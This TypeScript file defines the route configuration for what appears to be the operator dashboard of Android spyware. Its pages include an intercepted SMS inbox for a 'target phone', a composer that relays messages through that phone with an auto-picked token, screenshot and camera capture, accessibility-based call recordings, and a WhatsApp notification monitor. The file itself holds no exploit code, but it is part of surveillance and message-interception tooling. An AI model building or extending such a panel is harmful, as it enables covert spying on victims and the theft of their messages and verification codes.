import {
  Activity,
  Image as ImageIcon,
  MessageCircle,
  MessageSquare,
  Mic,
  PhoneCall,
  Send,
  Settings,
} from 'lucide-react';

export const DASHBOARD_ROUTES = [
  {
    key: 'overview',
    path: '/overview',
    label: 'Overview',
    icon: Activity,
    title: 'Device Administration',
    description: 'Monitor online state and trigger actions.',
  },
  {
    key: 'controls',
    path: '/controls',
    label: 'Control Center',
    icon: Settings,
    title: 'Unified Control Center',
    description: 'Trigger all supported remote actions from one place.',
  },
  {
    key: 'sms',
    path: '/sms',
    label: 'SMS Inbox',
    icon: MessageSquare,
    title: 'Intercepted SMS Inbox',
    description: 'Read all messages received by target phone.',
  },
  {
    key: 'relay',
    path: '/relay',
    label: 'Remote Send',
    icon: Send,
    title: 'Message Relay Composer',
    description: 'Open from any message, auto-pick token, and forward it through selected phone.',
  },
  {
    key: 'calls',
    path: '/calls',
    label: 'Call History',
    icon: PhoneCall,
    title: 'Device Call Logs',
    description: 'Detailed phone call historical records.',
  },
  {
    key: 'media',
    path: '/media',
    label: 'Screens & Camera',
    icon: ImageIcon,
    title: 'Screenshots & Photos',
    description: 'Live view of screen captures and pictures.',
  },
  {
    key: 'recordings',
    path: '/recordings',
    label: 'Voice Recordings',
    icon: Mic,
    title: 'Audio Recordings Vault',
    description: 'Voice recordings and accessibility call audio.',
  },
  {
    key: 'whatsapp',
    path: '/whatsapp',
    label: 'WhatsApp Feed',
    icon: MessageCircle,
    title: 'WhatsApp Notification Monitor',
    description: 'Real-time notification listener capturing WhatsApp chats.',
  },
];

export const SEARCHABLE_ROUTE_KEYS = ['sms', 'calls', 'whatsapp'];
